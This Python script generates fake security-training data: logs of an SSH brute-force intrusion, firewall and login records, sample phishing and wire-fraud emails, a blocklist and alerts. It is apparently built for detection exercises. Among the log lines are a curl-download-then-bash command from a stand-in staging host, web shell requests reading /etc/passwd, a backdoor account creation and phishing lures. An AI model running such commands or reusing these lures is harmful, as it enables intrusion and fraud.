#!/usr/bin/env python3
"""Regenerates every file in sample_data/ - deterministic, standard library only.

ALL DATA HERE IS FAKE. Hosts, users and domains are invented. IP addresses come
from the documentation ranges reserved for examples (RFC 5737: 192.0.2.0/24,
198.51.100.0/24, 203.0.113.0/24) plus private 10.0.0.0/24, so nothing points at
a real machine. Domains use the reserved ".example" TLD.

The story ("INC-FAKE-001", 28 Oct 2026):
  * 203.0.113.45 brute-forces SSH on web01, logs in as 'deploy', downloads a
    script from 198.51.100.77, installs a web shell and beacons to a C2 port.
  * Other noise: a password spray, a distributed attack on 'admin', a port scan,
    a WordPress login brute force, plus normal staff activity.
"""
import base64
import hashlib
import json
import random
from datetime import datetime, timedelta
from email.message import EmailMessage
from pathlib import Path

HERE = Path(__file__).resolve().parent
rng = random.Random(2026)
DAY = datetime(2026, 10, 28)
NOTICE = "FAKE SAMPLE DATA - synthetic training data, not real logs. All names, hosts and IPs are invented."


def at(h, m=0, s=0):
    return DAY + timedelta(hours=h, minutes=m, seconds=s)


# ---------------------------------------------------------------- auth.log (syslog / sshd)
auth = []
VALID_USERS = {"root", "alice", "bob", "carol", "deploy", "jsmith", "admin", "dave", "erin", "frank", "grace", "heidi"}


def syslog(ts, proc, msg):
    auth.append((ts, "%s %2d %s web01 %s: %s" % (ts.strftime("%b"), ts.day, ts.strftime("%H:%M:%S"), proc, msg)))


def ssh_fail(ts, ip, user):
    pid, port = rng.randint(1000, 60000), rng.randint(30000, 65000)
    if user not in VALID_USERS:
        syslog(ts, "sshd[%d]" % pid, "Invalid user %s from %s port %d" % (user, ip, port))
    pre = "" if user in VALID_USERS else "invalid user "
    syslog(ts, "sshd[%d]" % pid, "Failed password for %s%s from %s port %d ssh2" % (pre, user, ip, port))


def ssh_ok(ts, ip, user, method="password"):
    syslog(ts, "sshd[%d]" % rng.randint(1000, 60000), "Accepted %s for %s from %s port %d ssh2" % (method, user, ip, rng.randint(30000, 65000)))


def sudo(ts, user, command):
    syslog(ts, "sudo", "%s : TTY=pts/0 ; PWD=/home/%s ; USER=root ; COMMAND=%s" % (user, user, command))


def burst(start, ip, users, n, gap):
    t = start
    for i in range(n):
        ssh_fail(t, ip, users[i % len(users)])
        t += timedelta(seconds=rng.randint(*gap))
    return t


# normal staff activity
for h, ip, user in [(8, "10.0.0.21", "alice"), (9, "10.0.0.22", "bob"), (10, "10.0.0.23", "carol"),
                    (13, "10.0.0.30", "deploy"), (15, "10.0.0.21", "alice"), (17, "10.0.0.24", "dave")]:
    ssh_ok(at(h, rng.randint(0, 59), rng.randint(0, 59)), ip, user, "publickey")
ssh_fail(at(9, 30, 10), "10.0.0.25", "jsmith"); ssh_fail(at(9, 30, 31), "10.0.0.25", "jsmith")
ssh_ok(at(9, 31, 4), "10.0.0.25", "jsmith")

# password spray from 192.0.2.60: many users, 1-2 tries each, slow enough to dodge lockouts
burst(at(1, 30), "192.0.2.60", ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy"] * 2, 16, (10, 20))

# the main attack: brute force then a successful login as 'deploy'
end = burst(at(2, 14, 3), "203.0.113.45", ["root", "admin", "ubuntu", "test", "oracle", "postgres", "deploy"], 22, (3, 9))
ssh_ok(end + timedelta(seconds=52), "203.0.113.45", "deploy")
sudo(at(2, 19, 5), "deploy", "/usr/bin/curl http://198.51.100.77/x.sh -o /tmp/x.sh")
sudo(at(2, 19, 40), "deploy", "/bin/bash /tmp/x.sh")
sudo(at(2, 22, 15), "deploy", "/usr/sbin/useradd -m support2")

# distributed attack on a single account ('admin') from five different IPs
for i, ip in enumerate(["203.0.113.101", "203.0.113.102", "203.0.113.103", "203.0.113.104", "203.0.113.105"]):
    for k in range(2):
        ssh_fail(at(4, i, 10 + k * 20), ip, "admin")

auth.append((at(0), "# " + NOTICE))
auth.sort(key=lambda r: r[0])
(HERE / "auth.log").write_text("\n".join(line for _, line in auth) + "\n")

# ---------------------------------------------------------------- webserver_access.log (nginx/apache combined)
web = []
UA = "Mozilla/5.0 (X11; Linux x86_64)"


def hit(ts, ip, method, path, status, size=None, ua=UA, user="-"):
    size = size if size is not None else rng.randint(300, 9000)
    web.append((ts, '%s - %s [%s +0000] "%s %s HTTP/1.1" %d %d "-" "%s"' % (
        ip, user, ts.strftime("%d/%b/%Y:%H:%M:%S"), method, path, status, size, ua)))


for i in range(24):  # ordinary visitors
    hit(at(rng.randint(6, 22), rng.randint(0, 59), rng.randint(0, 59)), "10.0.0.%d" % rng.randint(21, 40), "GET",
        rng.choice(["/", "/about", "/static/app.js", "/products", "/contact"]), 200)
# WordPress login brute force from 198.51.100.200 that finally succeeds (302 redirect)
t = at(3, 10)
for i in range(12):
    hit(t, "198.51.100.200", "POST", "/wp-login.php", 401, 1200, "python-requests/2.31")
    t += timedelta(seconds=rng.randint(2, 5))
hit(t, "198.51.100.200", "POST", "/wp-login.php", 302, 0, "python-requests/2.31")
# attacker 203.0.113.45 uses the foothold: web shell upload and command execution
hit(at(2, 25, 11), "203.0.113.45", "GET", "/admin/login", 200)
hit(at(2, 25, 40), "203.0.113.45", "POST", "/upload.php", 200, 85)
hit(at(2, 26, 2), "203.0.113.45", "GET", "/uploads/shell.php?cmd=id", 200, 54)
hit(at(2, 26, 30), "203.0.113.45", "GET", "/uploads/shell.php?cmd=cat%20/etc/passwd", 200, 1830)
web.append((at(0), "# " + NOTICE))
web.sort(key=lambda r: r[0])
(HERE / "webserver_access.log").write_text("\n".join(line for _, line in web) + "\n")

# ---------------------------------------------------------------- firewall.log (key=value)
fw = []


def fwline(ts, action, direction, src, dst, dport, proto="TCP"):
    fw.append((ts, "%s host=fw01 action=%s dir=%s proto=%s src=%s sport=%d dst=%s dport=%d" % (
        ts.strftime("%Y-%m-%dT%H:%M:%SZ"), action, direction, proto, src, rng.randint(30000, 65000), dst, dport)))


# port scan from 192.0.2.77 (denied)
for i, port in enumerate([21, 22, 23, 25, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 5900, 8080, 8443]):
    fwline(at(0, 55, i), "DENY", "IN", "192.0.2.77", "10.0.0.5", port)
# inbound ssh allowed from attacker, then outbound staging + C2 beacons
for ts in (at(2, 14, 1), at(2, 17, 10)):
    fwline(ts, "ALLOW", "IN", "203.0.113.45", "10.0.0.5", 22)
fwline(at(2, 19, 20), "ALLOW", "OUT", "10.0.0.5", "198.51.100.77", 80)
for i in range(6):
    fwline(at(2, 21 + i * 5, rng.randint(0, 5)), "ALLOW", "OUT", "10.0.0.5", "198.51.100.77", 4444)
for i in range(10):  # ordinary traffic
    fwline(at(rng.randint(6, 20), rng.randint(0, 59), rng.randint(0, 59)), "ALLOW", "OUT", "10.0.0.%d" % rng.randint(21, 30), "198.51.100.10", 443)
fw.append((at(0), "# " + NOTICE))
fw.sort(key=lambda r: r[0])
(HERE / "firewall.log").write_text("\n".join(line for _, line in fw) + "\n")

# ---------------------------------------------------------------- logins.csv (for the suspicious login analyzer)
logins = ["# " + NOTICE, "timestamp,user,ip,country,city,lat,lon,tz_offset,device,result"]
NYC = ("US", "New York", 40.71, -74.01, -4)
LON = ("GB", "London", 51.51, -0.13, 0)
SYD = ("AU", "Sydney", -33.87, 151.21, 11)
MOW = ("RU", "Moscow", 55.76, 37.62, 3)
SAO = ("BR", "Sao Paulo", -23.55, -46.63, -3)


def login(ts, user, ip, geo, device, result="success"):
    logins.append("%s,%s,%s,%s,%s,%.2f,%.2f,%d,%s,%s" % (ts, user, ip, geo[0], geo[1], geo[2], geo[3], geo[4], device, result))


for d in (25, 26, 27):
    login("2026-10-%dT13:%02d:00Z" % (d, rng.randint(0, 59)), "alice", "198.51.100.40", NYC, "laptop-alice")
    login("2026-10-%dT09:%02d:00Z" % (d, rng.randint(0, 59)), "bob", "192.0.2.91", LON, "laptop-bob")
    login("2026-10-%dT22:%02d:00Z" % (d, rng.randint(0, 59)), "carol", "203.0.113.88", SYD, "laptop-carol")
    login("2026-10-%dT14:%02d:00Z" % (d, rng.randint(0, 59)), "dave", "198.51.100.41", NYC, "laptop-dave")
login("2026-10-28T13:05:00Z", "alice", "198.51.100.40", NYC, "laptop-alice")
login("2026-10-28T13:25:00Z", "alice", "203.0.113.150", MOW, "unknown-android")      # impossible travel
login("2026-10-28T03:12:00Z", "bob", "192.0.2.91", LON, "laptop-bob")                # off-hours only
login("2026-10-28T17:40:00Z", "carol", "203.0.113.89", SAO, "laptop-carol")          # new country
login("2026-10-28T14:02:00Z", "dave", "198.51.100.41", NYC, "phone-dave")            # new device
login("2026-10-28T13:20:00Z", "alice", "203.0.113.150", MOW, "unknown-android", "failure")
(HERE / "logins.csv").write_text("\n".join(logins) + "\n")

# ---------------------------------------------------------------- emails
def base_msg(sender, to, subject, received, auth_results, reply_to=None, return_path=None):
    m = EmailMessage()
    m["X-Sample-Data"] = "FAKE - synthetic training email, not a real message"
    for r in reversed(received):      # the lists below are oldest-first; real mail stacks NEWEST headers on top
        m["Received"] = r
    m["Return-Path"] = return_path or "<%s>" % sender.split("<")[-1].rstrip(">")
    m["Authentication-Results"] = auth_results
    m["From"] = sender
    if reply_to:
        m["Reply-To"] = reply_to
    m["To"] = to
    m["Subject"] = subject
    m["Date"] = "Wed, 28 Oct 2026 03:40:55 +0000"
    m["Message-ID"] = "<%d@sample.example>" % rng.randint(10000, 99999)
    return m


def save(name, msg):
    (HERE / "emails" / name).write_bytes(msg.as_bytes())


m = base_msg("Example News <news@example-news.example>", "alice@victim-corp.example", "Your weekly digest",
             ["from mail.example-news.example (mail.example-news.example [192.0.2.25]) by mx.victim-corp.example with ESMTPS; Wed, 28 Oct 2026 03:40:50 +0000"],
             "mx.victim-corp.example; spf=pass smtp.mailfrom=example-news.example; dkim=pass header.d=example-news.example; dmarc=pass header.from=example-news.example")
m.set_content("This week's top stories: https://www.example-news.example/post/42\n")
m.add_alternative('<html><body><p>This week\'s top stories: <a href="https://www.example-news.example/post/42">Read the digest</a></p></body></html>', subtype="html")
save("01_legit_newsletter.eml", m)

m = base_msg('"PayPal Security" <service@paypa1-secure.example>', "alice@victim-corp.example",
             "URGENT: Your account has been suspended - verify within 24 hours",
             ["from mail.paypa1-secure.example (mail.paypa1-secure.example [198.51.100.77]) by relay.bulk-sender.example with SMTP; Wed, 28 Oct 2026 03:40:30 +0000",
              "from relay.bulk-sender.example (relay.bulk-sender.example [203.0.113.77]) by mx.victim-corp.example with ESMTP; Wed, 28 Oct 2026 03:40:54 +0000"],
             "mx.victim-corp.example; spf=fail smtp.mailfrom=bulk-sender.example; dkim=none; dmarc=fail header.from=paypa1-secure.example",
             reply_to="helpdesk-paypal@mail-collector.example", return_path="<bounce@bulk-sender.example>")
m.set_content("Your account is suspended. Verify now: http://login.paypa1-secure.example/verify\n")
m.add_alternative('<html><body><p>Your account is suspended.</p><p><a href="http://198.51.100.77/verify">https://www.paypal.com/verify</a></p>'
                  '<p>Or sign in: <a href="http://login.paypa1-secure.example/verify">PayPal Login</a></p></body></html>', subtype="html")
save("02_phish_paypal_lookalike.eml", m)

m = base_msg('"Dana Whitfield" <dana.whitfield@acme-corp.example>', "finance@victim-corp.example", "Quick favor - urgent wire needed today",
             ["from vps-4471.bulk-sender.example (vps-4471.bulk-sender.example [203.0.113.150]) by mx.victim-corp.example with ESMTP; Wed, 28 Oct 2026 03:40:50 +0000"],
             "mx.victim-corp.example; spf=softfail smtp.mailfrom=acme-corp.example; dkim=none; dmarc=fail header.from=acme-corp.example",
             reply_to='"Dana Whitfield" <dana.whitfield.ceo@mail-collector.example>', return_path="<dana.whitfield@acme-corp.example>")
m.set_content("I'm in a meeting and need a wire sent today. Reply to this email only. Keep this confidential.\n")
save("03_bec_ceo_wire.eml", m)

fake_exe = b"FAKE-SAMPLE-EXECUTABLE-CONTENT - NOT REAL MALWARE - DO NOT RUN"
fake_docm = b"FAKE-SAMPLE-MACRO-DOCUMENT - NOT REAL MALWARE"
m = base_msg('"Accounts Payable" <ap@invoices-delivery.example>', "alice@victim-corp.example", "Invoice 8841 attached - payment overdue",
             ["from mail.invoices-delivery.example (mail.invoices-delivery.example [203.0.113.99]) by mx.victim-corp.example with ESMTP; Wed, 28 Oct 2026 03:40:50 +0000"],
             "mx.victim-corp.example; spf=pass smtp.mailfrom=invoices-delivery.example; dkim=none; dmarc=none header.from=invoices-delivery.example")
m.set_content("Please see the attached invoice. Payment overdue. Details: https://bit.ly/FakeSample123\n")
m.add_attachment(fake_exe, maintype="application", subtype="octet-stream", filename="Invoice_8841.pdf.exe")
m.add_attachment(fake_docm, maintype="application", subtype="vnd.ms-word.document.macroEnabled.12", filename="payroll_update.docm")
save("04_malicious_attachment.eml", m)

# ---------------------------------------------------------------- threat intel blocklist (offline, user-maintained)
exe_hash = hashlib.sha256(fake_exe).hexdigest()
(HERE / "blocklist.csv").write_text("\n".join([
    "# " + NOTICE,
    "indicator,type,source,confidence,note",
    "203.0.113.45,ip,Sample-Internal-Blocklist,95,SSH brute-force source (fake)",
    "198.51.100.77,ip,Sample-Internal-Blocklist,90,Fake malware staging and C2 server",
    "192.0.2.64/28,ip,Sample-Scanner-List,60,Fake scanning range",
    "paypa1-secure.example,domain,Sample-Phish-Feed,85,Fake PayPal look-alike domain",
    "mail-collector.example,domain,Sample-Phish-Feed,70,Fake reply-to collection domain",
    "%s,sha256,Sample-Malware-Feed,100,Fake hash of the sample 'executable' attachment" % exe_hash,
]) + "\n")

# ---------------------------------------------------------------- alerts and assets
alerts = [
    ("A-001", "SSH brute force then successful login", "ids", "high", "brute_force", "web01", "deploy", "203.0.113.45",
     "22 failed SSH logins followed by a success", ["successful_login_after_failures", "internet_facing"], "2026-10-28T02:17:12Z"),
    ("A-002", "Outbound connection to rare port 4444", "firewall", "medium", "c2_beaconing", "web01", "", "10.0.0.5",
     "Repeated outbound connections every ~5 minutes", ["known_bad_ip"], "2026-10-28T02:21:03Z"),
    ("A-003", "Web shell access pattern", "waf", "high", "webshell", "web01", "", "203.0.113.45",
     "Request to /uploads/shell.php with cmd parameter", ["known_bad_ip", "internet_facing"], "2026-10-28T02:26:02Z"),
    ("A-004", "Password spray detected", "ids", "medium", "password_spray", "web01", "", "192.0.2.60",
     "10 usernames tried from one IP", [], "2026-10-28T01:34:00Z"),
    ("A-005", "Port scan from external host", "firewall", "low", "port_scan", "web01", "", "192.0.2.77",
     "16 denied connections across 16 ports", [], "2026-10-28T00:55:16Z"),
    ("A-006", "Impossible travel for alice", "idp", "high", "impossible_travel", "laptop-alice", "alice", "203.0.113.150",
     "New York to Moscow in 20 minutes", ["impossible_travel"], "2026-10-28T13:25:00Z"),
    ("A-007", "Off-hours login for bob", "idp", "low", "off_hours_login", "laptop-bob", "bob", "192.0.2.91",
     "Login at 03:12 UTC", ["after_hours"], "2026-10-28T03:12:00Z"),
    ("A-008", "New admin-like account created", "auditd", "high", "account_creation", "web01", "deploy", "",
     "useradd support2 executed via sudo", ["privileged_account"], "2026-10-28T02:22:15Z"),
    ("A-009", "WordPress login brute force", "waf", "medium", "brute_force", "web01", "", "198.51.100.200",
     "12 failed wp-login attempts then success", ["successful_login_after_failures", "internet_facing"], "2026-10-28T03:10:40Z"),
    ("A-010", "Printer firmware check-in", "network", "info", "informational", "printer01", "", "10.0.0.88",
     "Routine vendor check-in", [], "2026-10-28T09:00:00Z"),
    ("A-011", "Phishing email reported by user", "email", "medium", "phishing_email", "mail01", "alice", "198.51.100.77",
     "User reported suspicious PayPal email", ["known_bad_ip"], "2026-10-28T03:55:00Z"),
    ("A-012", "Failed logins for jsmith", "auth", "low", "failed_login", "web01", "jsmith", "10.0.0.25",
     "2 failures then success", [], "2026-10-28T09:30:31Z"),
]
(HERE / "alerts.json").write_text(json.dumps({
    "_notice": NOTICE,
    "alerts": [dict(zip(("id", "title", "source", "severity", "category", "asset", "user", "src_ip", "description", "tags", "timestamp"), a)) for a in alerts],
}, indent=2) + "\n")
(HERE / "assets.json").write_text(json.dumps({
    "_notice": NOTICE,
    "assets": {"web01": 4, "db01": 5, "dc01": 5, "mail01": 4, "vpn01": 4, "laptop-alice": 2, "laptop-bob": 2, "printer01": 1},
}, indent=2) + "\n")
print("sample data written to", HERE)
